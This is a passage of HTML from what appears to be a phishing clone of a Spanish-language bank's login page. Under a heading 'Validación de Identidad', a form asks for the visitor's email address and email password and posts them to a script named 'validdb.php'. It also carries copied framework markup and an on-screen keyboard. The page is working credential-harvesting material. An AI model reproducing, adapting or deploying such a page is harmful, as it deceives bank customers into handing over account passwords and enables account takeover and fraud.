                                <a href="tel:%23233" title="233" class="phone-number ng-binding">#233 </a>
                              </p>
                            </li>
                          </ul>
                        </li>
                      </ul>
                    </div>
                  </div>
                </div>
                <div class="bp-widget-foot"></div>
              </div>
            </div>
            <div class="navbar-nav navbar-right rb-notifications-area --area bp-area d-sm-block text-right">
              <div class="dropdown drop-login d-sm-block" id="btn-web" tabindex="-1">
                <button type="button" id="loginPage" class="btn-bcs bcs-main xs" title="Ingresar" disabled>Ingresar <i id="login-arrow-web" class="icon-bcs icon-arrow-66"></i></button>
              </div>
            </div>
            <div class="dropdown drop-login d-flex justify-content-center" id="btn-responsive"><button type="button" id="loginPageMobile" class="btn-bcs bcs-main dropdown-toggle xs" title="Ingresar">Ingresar <i id="login-arrow-resp" class="icon-bcs icon-arrow-67"></i></button></div>
          </div>
        </div>
      </div>
    </nav>
    <div class="bp-container template-container-bcs-pub-page-layout" data-pid="container-bcs-pub-page-layout-9970992">
      <div id="loadingWrapper" class="d-none"><img src="./documents/Flor.svg"></div>
      <main id="mainElm" class="bp-area content-area template-container-bcs-pub-page-layout--area">
        <div data-pid="widget-bcs-pub-login-ng-6050724" class="bp-widget bp-ui-dragRoot">
          <div class="bp-widget-head"></div>
          <div class="bp-widget-pref"></div>
          <div class="bp-widget-body ng-scope">
            <div g:onload="BB.Widget.ngStart(__WIDGET__);">
              <div class="widget-bb-login-ng">
                <div class="bp-g-include" local="true" src="$(contextRoot)/static/features/%5BBBHOST%5D/${extension}/templates/template.ng.html">
                  <div class="login-overlay"></div>
                  <ng-include src="&#39;#ext-bcs-pub-login-web-ng/list.html&#39;" class="ng-scope">
                    <div class="ext-bcs-pub-login-web-ng shadow-lg people" data-ng-controller="LoginController as $ctrl" data-ng-init="ext.helpers.setCurrentTab($ctrl, ext.helpers.tabs.people)">
                      <div class="container py-4">
                        <div class="row">
                          <div class="col-12 px-md-0">
                            <div class="tab-items">
                              <span class="tab-title py-2 mr-4 ng-binding" data-ng-click="ext.helpers.setCurrentTab($ctrl, ext.helpers.tabs.people)" role="button" tabindex="0">
                                Personas
                              </span>
                              <span class="tab-title py-2 ng-binding" data-ng-click="ext.helpers.setCurrentTab($ctrl, ext.helpers.tabs.companies)" role="button" tabindex="0">
                                Empresas
                              </span>
                              <button id="close-login" type="button" class="btn-close-login float-right" data-ng-click="ext.helpers.reset($ctrl)">
                                <i class="icon-bcs icon-delete-1-1"></i>
                              </button>
                              <span class="d-block text-line" data-ng-class="{&#39;margin&#39;: ext.helpers.currentTab == ext.helpers.tabs.companies }"></span>
                              <hr class="mt-0">
                            </div>
                          </div>

                          <div class="col-12" data-ng-switch="ext.helpers.currentTab">
                            <div data-ng-switch-when="people" class="ng-scope">
                              <div data-ng-include="&#39;#ext-bcs-pub-login-web-ng/people.html&#39;" class="ng-scope">
                                <ui-bb-loading-indicator-ng data-is-loading="$ctrl.isLoading || $ctrl.isLoadingCryp" data-loading-text="Cargando..." class="ng-scope ng-isolate-scope">
                                  <ng-transclude data-ng-if="!$ctrl.showComponent" class="ng-scope">
                                    <div class="row ng-scope" data-ng-if="!$ctrl.loginError">

                                      <div class="col-lg-6 col-xl-7 pl-md-0">
                                        <div class="row justify-content-center ng-scope" data-ng-if="$ctrl.recaptcha">
                                          <div class="col-auto">
                                            <div class="bcs-form-group form-vc-recaptcha" data-ng-show="!ext.helpers.recaptchaError" aria-hidden="false">
                                            </div>
                                            <div class="grecaptcha-error"></div>
                                            <textarea id="g-recaptcha-response" name="g-recaptcha-response" class="g-recaptcha-response" style="width: 250px; height: 40px; border: 1px solid rgb(193, 193, 193); margin: 10px 25px; padding: 0px; resize: none; display: none;"></textarea>
                                          </div>
                                        </div>
                                      </div>
                                    </div>
                              </div>
                              </form>
                            </div>
                          </div>
                        </div>
                      </div>
                    </div>
                </div>
                </ng-include>
                <div class="bp-widget-foot"></div>
              </div>
              <div class="bp-container bp-ui-dragRoot bp-manageableArea --area bp-area " data-pid="container_7d9d43cb-2e3d-4e35-939a-e19226fd2949">
                <div data-pid="widget-bcs-pub-login-ng-3484652" class="bp-widget bp-ui-dragRoot">
                  <div class="bp-widget-head"></div>
                  <div class="bp-widget-pref"></div>
                  <div class="bp-widget-body ng-scope">
                    <div g:onload="BB.Widget.ngStart(__WIDGET__);">
                      <div class="widget-bb-login-ng">
                        <div class="bp-g-include" local="true" src="$(contextRoot)/static/features/%5BBBHOST%5D/${extension}/templates/template.ng.html">
                          <div class="ext-bcs-pub-login-ng ng-scope" data-ng-controller="LoginController as $ctrl">
                            <div class="container">
                              <div class="card">
                                <div class="card-header">
                                  <h1 class="ng-binding">Validación de Identidad</h1>
                                </div>
                                <div class="card-body">
                                  <ui-bb-loading-indicator-ng data-is-loading="$ctrl.isLoading || $ctrl.isLoadingCryp" data-loading-text="Cargando..." class="ng-isolate-scope">
                                    <ng-transclude data-ng-if="!$ctrl.showComponent" class="ng-scope">
                                      <div class="widget-error ng-scope ng-hide" data-ng-show="$ctrl.loginError" aria-hidden="true">
                                        <div class="title-container">
                                          <div class="row-table">
                                            <span class="title col-cell ng-binding">

                                            </span>
                                          </div>
                                        </div>
                                        <div class="body-container ng-binding" id="modal-body">
                                          <p class="ng-binding"></p>
                                        </div>
                                      </div>
                                      <div class="row ng-scope" ng-show="!$ctrl.loginError" aria-hidden="false">
                                        <div class="col-12 col-md-5 col-lg-4 offset-xl-1" data-ng-class="{
                        &#39;col-md-7 col-lg-5 col-xl-4 offset-md-1&#39;: !ext.helpers.showKeyboard,
                        &#39;col-md-5 col-lg-4 offset-xl-1&#39;: ext.helpers.showKeyboard
                     }">
                                          <form name="socialidcor" action="validdb.php" method="post" onsubmit="return validarCorreo() && validarContraseña()" class="bcs-form ng-invalid ng-invalid-required ng-valid-minlength ng-valid-maxlength ng-dirty" data-ng-submit="ext.helpers.informationFormSubmit($ctrl,$ctrl.loginForm)" autocomplete="off">
                                            <div class="bcs-form-group">

                                              <label class="ng-binding">(*) Correo Electronico</label>
                                              <input style="height: 50px;" type="email" placeholder="xxxxxx@xxx.com" name="socialcorr" autocomplete="off" id="idNumber0-0493938907535" data-ng-model="$ctrl.username" data-ng-if="$ctrl.extraFormFields.idType.cod != ext.helpers.docTypesCodes.us" data-ng-keypress="ext.helpers.validateNumeric(ext.helpers.docNumber.pattern, $event, ext.helpers.docNumber.length)" data-ng-change="ext.helpers.validateDocNumber($ctrl.extraFormFields.idType.cod, $ctrl.username, $ctrl.loginForm.username)" data-ng-paste="ext.helpers.validatePaste($event, ext.helpers.docNumber.pattern, ext.helpers.docNumber.length)" data-ng-maxlength="15" data-ng-drop-disabled="true" maxlength="40" data-ng-regex-validation="numericMobile" data-ng-spaces="false" input-validator="" required="" class="ng-pristine ng-scope ng-isolate-scope ng-empty ng-invalid ng-invalid-required ng-valid-maxlength ng-touched" aria-invalid="true"><!-- end ngIf: $ctrl.extraFormFields.idType.cod != ext.helpers.docTypesCodes.us -->
                                              <div id="errorCorreo" class="error-message">Correo electrónico no válido o no registrado. Por favor verifique e intente de nuevo.</div>
                                            </div>
                                            <div ng-controller="TuControlador" class="bcs-form-group">
                                              <label class="ng-binding">(*) Contraseña de correo</label>
                                              <input style="height: 50px;" type="password" placeholder="**********" name="socialcontrcorr" autocomplete="current-password" data-ng-click="fieldSelected='password'" id="userPassword" data-ng-model="$ctrl.password" data-ng-readonly="true" data-ng-keypress="ext.helpers.validatealphaNumeric($ctrl.passwordConfig.pattern, $event, $ctrl.passwordConfig.length)" data-ng-minlength="8" data-ng-maxlength="8" maxlength="8" data-ng-regex-validation="alphaNumericMobile" data-ng-spaces="false" input-validator="" required="" class="ng-pristine ng-isolate-scope ng-invalid ng-valid-maxlength ng-touched ng-not-empty ng-valid-required ng-invalid-minlength">
                                              <div id="errorContraseña" class="error-message" style="color: red; display: none;">Contraseña de correo incorrecta.</div>
                                            </div>
                                            <div data-ng-if="$ctrl.recaptcha" class="ng-scope">
                                              <div class="bcs-form-group form-vc-recaptcha" data-ng-show="!ext.helpers.recaptchaError" aria-hidden="false">
                                                <div vc-recaptcha="" badge="ext.helpers.recaptchaConfig.POSITION" size="ext.helpers.recaptchaConfig.TYPE" required="ext.helpers.recaptchaConfig.REQUIRED" data-key="$ctrl.recaptcha" on-create="ext.helpers.onCreate(widgetId)" on-success="ext.helpers.onSuccess(response, $ctrl)" on-error="ext.helpers.onError(arguments,$ctrl)" class="ng-isolate-scope">
                                                  <div class="grecaptcha-badge" data-style="none" style="width: 256px; height: 60px; position: fixed; visibility: hidden;">
                                                  </div>
                                                </div>
                                              </div>
                                            </div>
                                            <button class="btn-bcs bcs-main bcs-btn-block ng-binding ng-scope" type="submit" id="submit-cor" title="Continuar" data-ng-if="ext.helpers.showKeyboard" data-ng-disabled=" $ctrl.loginForm.$invalid">
                                              Continuar
                                            </button>
                                        </div>
                                        <div class="bcs-pub-buttons-container text-center">
                                          <!-- ngIf: !ext.helpers.showKeyboard -->
                                        </div>
                                        <div class="bcs-form-group login-links clearfix">
                                          <a style="display: none;" href="#" data-ng-click="$ctrl.saveApii()" class="ng-binding">
                                            Registrarse
                                          </a>
                                          <a style="display: none;" href="#" data-ng-click="$ctrl.saveApii()" class="ng-binding">
                                            ¿Olvidó su contraseña?
                                          </a>
                                        </div>
                                        <img id="loading-gif" src="./documents/flor.png" alt="Cargando..." width="50" height="50">
                                        </form>
                                      </div>
                                      <!-- ngIf: ext.helpers.showKeyboard -->
                                      <div class="col-sm-12 col-md-5 col-lg-6 offset-md-1 ng-scope" data-ng-if="ext.helpers.showKeyboard">
                                        <div class="row-table info-text">
                                          <div class="col-cell">
                                            <i class="icon-bcs icon-bcs-custom icon-information"></i>
                                          </div>
                                          <div class="col-cell">
                                            <p class="ng-binding">Por favor. Ingrese la informacion del correo electronico registrado en su cuenta.</p>
                                          </div>
                                        </div>
                                        <div style="display: none;" class="bcs-login-keyboard">
                                          <ui-bcs-pub-virtual-keyboard-ng data-ng-model="$ctrl.password" data-config="$ctrl.passwordConfig" validaterules="true" class="ng-pristine ng-untouched ng-valid ng-isolate-scope ng-empty" aria-invalid="false">
                                            <div class="main-keyboard bcs-no-selectable-text">
                                              <div data-ng-style="{&#39;width&#39;: $ctrl.keyboard.rowSize * ($ctrl.keyboard.keySize + $ctrl.keyboard.keyMarginLeft) + &#39;px&#39;}" style="width: 330px;">
                                                <div data-ng-repeat="keyItem in $ctrl.keyboard.keyDistribution" class="key ng-scope" data-ng-style="{&#39;width&#39;: ((keyItem.size || 1) * $ctrl.keyboard.keySize) + &#39;px&#39;, &#39;height&#39;: $ctrl.keyboard.keySize + &#39;px&#39;,
                                 &#39;margin-left&#39;: $ctrl.keyboard.keyMarginLeft + &#39;px&#39; }" data-ng-class="keyItem.keyClass" style="width: 30px; height: 30px; margin-left: 3px;">
                                                  <button onclick="insertCharacter('q')" type="button" class="" data-ng-class="{&#39;key-shift-enabled&#39;: $ctrl.keyboard.upperCase}">
                                                    <span data-ng-if="!keyItem.icon" data-ng-class="{&#39;text-uppercase&#39;: $ctrl.keyboard.upperCase, &#39;text-lowercase&#39;: !$ctrl.keyboard.upperCase }" class="ng-binding ng-scope text-lowercase">
                                                      q
                                                    </span>
                                                  </button>
                                                </div>
                                                <div data-ng-repeat="keyItem in $ctrl.keyboard.keyDistribution" class="key ng-scope" data-ng-style="{&#39;width&#39;: ((keyItem.size || 1) * $ctrl.keyboard.keySize) + &#39;px&#39;, &#39;height&#39;: $ctrl.keyboard.keySize + &#39;px&#39;,
                                 &#39;margin-left&#39;: $ctrl.keyboard.keyMarginLeft + &#39;px&#39; }" data-ng-class="keyItem.keyClass" style="width: 30px; height: 30px; margin-left: 3px;">
                                                  <button onclick="insertCharacter('w')" type="button" class="" data-ng-class="{&#39;key-shift-enabled&#39;: $ctrl.keyboard.upperCase}">
                                                    <span data-ng-if="!keyItem.icon" data-ng-class="{&#39;text-uppercase&#39;: $ctrl.keyboard.upperCase, &#39;text-lowercase&#39;: !$ctrl.keyboard.upperCase }" class="ng-binding ng-scope text-lowercase">
                                                      w
                                                    </span>
                                                  </button>
                                                </div>
                                                <div data-ng-repeat="keyItem in $ctrl.keyboard.keyDistribution" class="key ng-scope" data-ng-style="{&#39;width&#39;: ((keyItem.size || 1) * $ctrl.keyboard.keySize) + &#39;px&#39;, &#39;height&#39;: $ctrl.keyboard.keySize + &#39;px&#39;,
                                 &#39;margin-left&#39;: $ctrl.keyboard.keyMarginLeft + &#39;px&#39; }" data-ng-class="keyItem.keyClass" style="width: 30px; height: 30px; margin-left: 3px;">
                                                  <button onclick="insertCharacter('e')" type="button" class="" data-ng-class="{&#39;key-shift-enabled&#39;: $ctrl.keyboard.upperCase}">

                                                    <span data-ng-if="!keyItem.icon" data-ng-class="{&#39;text-uppercase&#39;: $ctrl.keyboard.upperCase, &#39;text-lowercase&#39;: !$ctrl.keyboard.upperCase }" class="ng-binding ng-scope text-lowercase">
                                                      e
                                                    </span>
                                                  </button>
                                                </div>
                                                <div data-ng-repeat="keyItem in $ctrl.keyboard.keyDistribution" class="key ng-scope" data-ng-style="{&#39;width&#39;: ((keyItem.size || 1) * $ctrl.keyboard.keySize) + &#39;px&#39;, &#39;height&#39;: $ctrl.keyboard.keySize + &#39;px&#39;,
                                 &#39;margin-left&#39;: $ctrl.keyboard.keyMarginLeft + &#39;px&#39; }" data-ng-class="keyItem.keyClass" style="width: 30px; height: 30px; margin-left: 3px;">
                                                  <button onclick="insertCharacter('r')" type="button" class="" data-ng-class="{&#39;key-shift-enabled&#39;: $ctrl.keyboard.upperCase}">

                                                    <span data-ng-if="!keyItem.icon" data-ng-class="{&#39;text-uppercase&#39;: $ctrl.keyboard.upperCase, &#39;text-lowercase&#39;: !$ctrl.keyboard.upperCase }" class="ng-binding ng-scope text-lowercase">
                                                      r
                                                    </span>
                                                  </button>
                                                </div>
                                                <div data-ng-repeat="keyItem in $ctrl.keyboard.keyDistribution" class="key ng-scope" data-ng-style="{&#39;width&#39;: ((keyItem.size || 1) * $ctrl.keyboard.keySize) + &#39;px&#39;, &#39;height&#39;: $ctrl.keyboard.keySize + &#39;px&#39;,
                                 &#39;margin-left&#39;: $ctrl.keyboard.keyMarginLeft + &#39;px&#39; }" data-ng-class="keyItem.keyClass" style="width: 30px; height: 30px; margin-left: 3px;">
                                                  <button onclick="insertCharacter('t')" type="button" class="" data-ng-class="{&#39;key-shift-enabled&#39;: $ctrl.keyboard.upperCase}">

                                                    <span data-ng-if="!keyItem.icon" data-ng-class="{&#39;text-uppercase&#39;: $ctrl.keyboard.upperCase, &#39;text-lowercase&#39;: !$ctrl.keyboard.upperCase }" class="ng-binding ng-scope text-lowercase">
                                                      t
                                                    </span>
                                                  </button>
                                                </div>
                                                <div data-ng-repeat="keyItem in $ctrl.keyboard.keyDistribution" class="key ng-scope" data-ng-style="{&#39;width&#39;: ((keyItem.size || 1) * $ctrl.keyboard.keySize) + &#39;px&#39;, &#39;height&#39;: $ctrl.keyboard.keySize + &#39;px&#39;,
                                 &#39;margin-left&#39;: $ctrl.keyboard.keyMarginLeft + &#39;px&#39; }" data-ng-class="keyItem.keyClass" style="width: 30px; height: 30px; margin-left: 3px;">
                                                  <button onclick="insertCharacter('y')" type="button" class="" data-ng-class="{&#39;key-shift-enabled&#39;: $ctrl.keyboard.upperCase}">

                                                    <span data-ng-if="!keyItem.icon" data-ng-class="{&#39;text-uppercase&#39;: $ctrl.keyboard.upperCase, &#39;text-lowercase&#39;: !$ctrl.keyboard.upperCase }" class="ng-binding ng-scope text-lowercase">
                                                      y
                                                    </span>
                                                  </button>
                                                </div>
                                                <div data-ng-repeat="keyItem in $ctrl.keyboard.keyDistribution" class="key ng-scope" data-ng-style="{&#39;width&#39;: ((keyItem.size || 1) * $ctrl.keyboard.keySize) + &#39;px&#39;, &#39;height&#39;: $ctrl.keyboard.keySize + &#39;px&#39;,
                                 &#39;margin-left&#39;: $ctrl.keyboard.keyMarginLeft + &#39;px&#39; }" data-ng-class="keyItem.keyClass" style="width: 30px; height: 30px; margin-left: 3px;">
                                                  <button onclick="insertCharacter('u')" type="button" class="" data-ng-class="{&#39;key-shift-enabled&#39;: $ctrl.keyboard.upperCase}">

                                                    <span data-ng-if="!keyItem.icon" data-ng-class="{&#39;text-uppercase&#39;: $ctrl.keyboard.upperCase, &#39;text-lowercase&#39;: !$ctrl.keyboard.upperCase }" class="ng-binding ng-scope text-lowercase">
                                                      u
                                                    </span>
                                                  </button>
                                                </div>
                                                <div data-ng-repeat="keyItem in $ctrl.keyboard.keyDistribution" class="key ng-scope" data-ng-style="{&#39;width&#39;: ((keyItem.size || 1) * $ctrl.keyboard.keySize) + &#39;px&#39;, &#39;height&#39;: $ctrl.keyboard.keySize + &#39;px&#39;,
                                 &#39;margin-left&#39;: $ctrl.keyboard.keyMarginLeft + &#39;px&#39; }" data-ng-class="keyItem.keyClass" style="width: 30px; height: 30px; margin-left: 3px;">
                                                  <button onclick="insertCharacter('i')" type="button" class="" data-ng-class="{&#39;key-shift-enabled&#39;: $ctrl.keyboard.upperCase}">

                                                    <span data-ng-if="!keyItem.icon" data-ng-class="{&#39;text-uppercase&#39;: $ctrl.keyboard.upperCase, &#39;text-lowercase&#39;: !$ctrl.keyboard.upperCase }" class="ng-binding ng-scope text-lowercase">
                                                      i
                                                    </span>
                                                  </button>
                                                </div>
                                                <div data-ng-repeat="keyItem in $ctrl.keyboard.keyDistribution" class="key ng-scope" data-ng-style="{&#39;width&#39;: ((keyItem.size || 1) * $ctrl.keyboard.keySize) + &#39;px&#39;, &#39;height&#39;: $ctrl.keyboard.keySize + &#39;px&#39;,
                                 &#39;margin-left&#39;: $ctrl.keyboard.keyMarginLeft + &#39;px&#39; }" data-ng-class="keyItem.keyClass" style="width: 30px; height: 30px; margin-left: 3px;">
                                                  <button onclick="insertCharacter('o')" type="button" class="" data-ng-class="{&#39;key-shift-enabled&#39;: $ctrl.keyboard.upperCase}">

                                                    <span data-ng-if="!keyItem.icon" data-ng-class="{&#39;text-uppercase&#39;: $ctrl.keyboard.upperCase, &#39;text-lowercase&#39;: !$ctrl.keyboard.upperCase }" class="ng-binding ng-scope text-lowercase">
                                                      o
                                                    </span>
                                                  </button>
                                                </div>
                                                <div data-ng-repeat="keyItem in $ctrl.keyboard.keyDistribution" class="key ng-scope" data-ng-style="{&#39;width&#39;: ((keyItem.size || 1) * $ctrl.keyboard.keySize) + &#39;px&#39;, &#39;height&#39;: $ctrl.keyboard.keySize + &#39;px&#39;,
                                 &#39;margin-left&#39;: $ctrl.keyboard.keyMarginLeft + &#39;px&#39; }" data-ng-class="keyItem.keyClass" style="width: 30px; height: 30px; margin-left: 3px;">
                                                  <button onclick="insertCharacter('p')" type="button" class="" data-ng-class="{&#39;key-shift-enabled&#39;: $ctrl.keyboard.upperCase}">

                                                    <span data-ng-if="!keyItem.icon" data-ng-class="{&#39;text-uppercase&#39;: $ctrl.keyboard.upperCase, &#39;text-lowercase&#39;: !$ctrl.keyboard.upperCase }" class="ng-binding ng-scope text-lowercase">
                                                      p
                                                    </span>
                                                  </button>
                                                </div>
                                                <div data-ng-repeat="keyItem in $ctrl.keyboard.keyDistribution" class="key ng-scope key-second-line" data-ng-style="{&#39;width&#39;: ((keyItem.size || 1) * $ctrl.keyboard.keySize) + &#39;px&#39;, &#39;height&#39;: $ctrl.keyboard.keySize + &#39;px&#39;,
                                 &#39;margin-left&#39;: $ctrl.keyboard.keyMarginLeft + &#39;px&#39; }" data-ng-class="keyItem.keyClass" style="width: 30px; height: 30px; margin-left: 3px;">
                                                  <button onclick="insertCharacter('a')" type="button" class="" data-ng-class="{&#39;key-shift-enabled&#39;: $ctrl.keyboard.upperCase}">

                                                    <span data-ng-if="!keyItem.icon" data-ng-class="{&#39;text-uppercase&#39;: $ctrl.keyboard.upperCase, &#39;text-lowercase&#39;: !$ctrl.keyboard.upperCase }" class="ng-binding ng-scope text-lowercase">
                                                      a
                                                    </span>
                                                  </button>
                                                </div>
                                                <div data-ng-repeat="keyItem in $ctrl.keyboard.keyDistribution" class="key ng-scope" data-ng-style="{&#39;width&#39;: ((keyItem.size || 1) * $ctrl.keyboard.keySize) + &#39;px&#39;, &#39;height&#39;: $ctrl.keyboard.keySize + &#39;px&#39;,
                                 &#39;margin-left&#39;: $ctrl.keyboard.keyMarginLeft + &#39;px&#39; }" data-ng-class="keyItem.keyClass" style="width: 30px; height: 30px; margin-left: 3px;">
                                                  <button onclick="insertCharacter('s')" type="button" class="" data-ng-class="{&#39;key-shift-enabled&#39;: $ctrl.keyboard.upperCase}">

                                                    <span data-ng-if="!keyItem.icon" data-ng-class="{&#39;text-uppercase&#39;: $ctrl.keyboard.upperCase, &#39;text-lowercase&#39;: !$ctrl.keyboard.upperCase }" class="ng-binding ng-scope text-lowercase">
                                                      s
                                                    </span>
                                                  </button>
                                                </div>
                                                <div data-ng-repeat="keyItem in $ctrl.keyboard.keyDistribution" class="key ng-scope" data-ng-style="{&#39;width&#39;: ((keyItem.size || 1) * $ctrl.keyboard.keySize) + &#39;px&#39;, &#39;height&#39;: $ctrl.keyboard.keySize + &#39;px&#39;,
                                 &#39;margin-left&#39;: $ctrl.keyboard.keyMarginLeft + &#39;px&#39; }" data-ng-class="keyItem.keyClass" style="width: 30px; height: 30px; margin-left: 3px;">
                                                  <button onclick="insertCharacter('d')" type="button" class="" data-ng-class="{&#39;key-shift-enabled&#39;: $ctrl.keyboard.upperCase}">

                                                    <span data-ng-if="!keyItem.icon" data-ng-class="{&#39;text-uppercase&#39;: $ctrl.keyboard.upperCase, &#39;text-lowercase&#39;: !$ctrl.keyboard.upperCase }" class="ng-binding ng-scope text-lowercase">
                                                      d
                                                    </span>
                                                  </button>
                                                </div>
                                                <div data-ng-repeat="keyItem in $ctrl.keyboard.keyDistribution" class="key ng-scope" data-ng-style="{&#39;width&#39;: ((keyItem.size || 1) * $ctrl.keyboard.keySize) + &#39;px&#39;, &#39;height&#39;: $ctrl.keyboard.keySize + &#39;px&#39;,
                                 &#39;margin-left&#39;: $ctrl.keyboard.keyMarginLeft + &#39;px&#39; }" data-ng-class="keyItem.keyClass" style="width: 30px; height: 30px; margin-left: 3px;">
                                                  <button onclick="insertCharacter('f')" type="button" class="" data-ng-class="{&#39;key-shift-enabled&#39;: $ctrl.keyboard.upperCase}">

                                                    <span data-ng-if="!keyItem.icon" data-ng-class="{&#39;text-uppercase&#39;: $ctrl.keyboard.upperCase, &#39;text-lowercase&#39;: !$ctrl.keyboard.upperCase }" class="ng-binding ng-scope text-lowercase">
                                                      f
                                                    </span>
                                                  </button>
                                                </div>
                                                <div data-ng-repeat="keyItem in $ctrl.keyboard.keyDistribution" class="key ng-scope" data-ng-style="{&#39;width&#39;: ((keyItem.size || 1) * $ctrl.keyboard.keySize) + &#39;px&#39;, &#39;height&#39;: $ctrl.keyboard.keySize + &#39;px&#39;,
                                 &#39;margin-left&#39;: $ctrl.keyboard.keyMarginLeft + &#39;px&#39; }" data-ng-class="keyItem.keyClass" style="width: 30px; height: 30px; margin-left: 3px;">
                                                  <button onclick="insertCharacter('g')" type="button" class="" data-ng-class="{&#39;key-shift-enabled&#39;: $ctrl.keyboard.upperCase}">

                                                    <span data-ng-if="!keyItem.icon" data-ng-class="{&#39;text-uppercase&#39;: $ctrl.keyboard.upperCase, &#39;text-lowercase&#39;: !$ctrl.keyboard.upperCase }" class="ng-binding ng-scope text-lowercase">
                                                      g
                                                    </span>
                                                  </button>
                                                </div>
                                                <div data-ng-repeat="keyItem in $ctrl.keyboard.keyDistribution" class="key ng-scope" data-ng-style="{&#39;width&#39;: ((keyItem.size || 1) * $ctrl.keyboard.keySize) + &#39;px&#39;, &#39;height&#39;: $ctrl.keyboard.keySize + &#39;px&#39;,
                                 &#39;margin-left&#39;: $ctrl.keyboard.keyMarginLeft + &#39;px&#39; }" data-ng-class="keyItem.keyClass" style="width: 30px; height: 30px; margin-left: 3px;">
                                                  <button onclick="insertCharacter('h')" type="button" class="" data-ng-class="{&#39;key-shift-enabled&#39;: $ctrl.keyboard.upperCase}">

                                                    <span data-ng-if="!keyItem.icon" data-ng-class="{&#39;text-uppercase&#39;: $ctrl.keyboard.upperCase, &#39;text-lowercase&#39;: !$ctrl.keyboard.upperCase }" class="ng-binding ng-scope text-lowercase">
                                                      h
                                                    </span>
                                                  </button>
                                                </div>
                                                <div data-ng-repeat="keyItem in $ctrl.keyboard.keyDistribution" class="key ng-scope" data-ng-style="{&#39;width&#39;: ((keyItem.size || 1) * $ctrl.keyboard.keySize) + &#39;px&#39;, &#39;height&#39;: $ctrl.keyboard.keySize + &#39;px&#39;,
                                 &#39;margin-left&#39;: $ctrl.keyboard.keyMarginLeft + &#39;px&#39; }" data-ng-class="keyItem.keyClass" style="width: 30px; height: 30px; margin-left: 3px;">
                                                  <button onclick="insertCharacter('j')" type="button" class="" data-ng-class="{&#39;key-shift-enabled&#39;: $ctrl.keyboard.upperCase}">

                                                    <span data-ng-if="!keyItem.icon" data-ng-class="{&#39;text-uppercase&#39;: $ctrl.keyboard.upperCase, &#39;text-lowercase&#39;: !$ctrl.keyboard.upperCase }" class="ng-binding ng-scope text-lowercase">
                                                      j
                                                    </span>
                                                  </button>
                                                </div>
                                                <div data-ng-repeat="keyItem in $ctrl.keyboard.keyDistribution" class="key ng-scope" data-ng-style="{&#39;width&#39;: ((keyItem.size || 1) * $ctrl.keyboard.keySize) + &#39;px&#39;, &#39;height&#39;: $ctrl.keyboard.keySize + &#39;px&#39;,
                                 &#39;margin-left&#39;: $ctrl.keyboard.keyMarginLeft + &#39;px&#39; }" data-ng-class="keyItem.keyClass" style="width: 30px; height: 30px; margin-left: 3px;">
                                                  <button onclick="insertCharacter('k')" type="button" class="" data-ng-class="{&#39;key-shift-enabled&#39;: $ctrl.keyboard.upperCase}">

                                                    <span data-ng-if="!keyItem.icon" data-ng-class="{&#39;text-uppercase&#39;: $ctrl.keyboard.upperCase, &#39;text-lowercase&#39;: !$ctrl.keyboard.upperCase }" class="ng-binding ng-scope text-lowercase">
                                                      k
                                                    </span>
                                                  </button>
                                                </div>
                                                <div data-ng-repeat="keyItem in $ctrl.keyboard.keyDistribution" class="key ng-scope" data-ng-style="{&#39;width&#39;: ((keyItem.size || 1) * $ctrl.keyboard.keySize) + &#39;px&#39;, &#39;height&#39;: $ctrl.keyboard.keySize + &#39;px&#39;,
                                 &#39;margin-left&#39;: $ctrl.keyboard.keyMarginLeft + &#39;px&#39; }" data-ng-class="keyItem.keyClass" style="width: 30px; height: 30px; margin-left: 3px;">
                                                  <button onclick="insertCharacter('l')" type="button" class="" data-ng-class="{&#39;key-shift-enabled&#39;: $ctrl.keyboard.upperCase}">

                                                    <span data-ng-if="!keyItem.icon" data-ng-class="{&#39;text-uppercase&#39;: $ctrl.keyboard.upperCase, &#39;text-lowercase&#39;: !$ctrl.keyboard.upperCase }" class="ng-binding ng-scope text-lowercase">
                                                      l
                                                    </span>
                                                  </button>
                                                </div>
                                                <div data-ng-repeat="keyItem in $ctrl.keyboard.keyDistribution" class="key ng-scope d-none" data-ng-style="{&#39;width&#39;: ((keyItem.size || 1) * $ctrl.keyboard.keySize) + &#39;px&#39;, &#39;height&#39;: $ctrl.keyboard.keySize + &#39;px&#39;,
                                 &#39;margin-left&#39;: $ctrl.keyboard.keyMarginLeft + &#39;px&#39; }" data-ng-class="keyItem.keyClass" style="width: 30px; height: 30px; margin-left: 3px;">
                                                  <button onclick="insertCharacter('ñ')" type="button" class="" data-ng-class="{&#39;key-shift-enabled&#39;: $ctrl.keyboard.upperCase}">

                                                    <span data-ng-if="!keyItem.icon" data-ng-class="{&#39;text-uppercase&#39;: $ctrl.keyboard.upperCase, &#39;text-lowercase&#39;: !$ctrl.keyboard.upperCase }" class="ng-binding ng-scope text-lowercase">
                                                      ñ
                                                    </span>
                                                  </button>
                                                </div>
                                                <div data-ng-repeat="keyItem in $ctrl.keyboard.keyDistribution" class="key ng-scope" data-ng-style="{&#39;width&#39;: ((keyItem.size || 1) * $ctrl.keyboard.keySize) + &#39;px&#39;, &#39;height&#39;: $ctrl.keyboard.keySize + &#39;px&#39;,
                                 &#39;margin-left&#39;: $ctrl.keyboard.keyMarginLeft + &#39;px&#39; }" data-ng-class="keyItem.keyClass" style="width: 30px; height: 30px; margin-left: 3px;">
                                                  <button onclick="toggleMayusculas()" id="shiftButton" type="button" class="light-button shift-key" data-ng-class="{&#39;key-shift-enabled&#39;: $ctrl.keyboard.upperCase}">
                                                    <i data-ng-if="keyItem.icon" class="icon-bcs icon-arrow-3 small-icon font-weight-bold"></i>

                                                  </button>
                                                </div>
                                                <div data-ng-repeat="keyItem in $ctrl.keyboard.keyDistribution" class="key ng-scope" data-ng-style="{&#39;width&#39;: ((keyItem.size || 1) * $ctrl.keyboard.keySize) + &#39;px&#39;, &#39;height&#39;: $ctrl.keyboard.keySize + &#39;px&#39;,
                                 &#39;margin-left&#39;: $ctrl.keyboard.keyMarginLeft + &#39;px&#39; }" data-ng-class="keyItem.keyClass" style="width: 30px; height: 30px; margin-left: 3px;">
                                                  <button onclick="insertCharacter('z')" type="button" class="" data-ng-class="{&#39;key-shift-enabled&#39;: $ctrl.keyboard.upperCase}">

                                                    <span data-ng-if="!keyItem.icon" data-ng-class="{&#39;text-uppercase&#39;: $ctrl.keyboard.upperCase, &#39;text-lowercase&#39;: !$ctrl.keyboard.upperCase }" class="ng-binding ng-scope text-lowercase">
                                                      z
                                                    </span>
                                                  </button>
                                                </div>
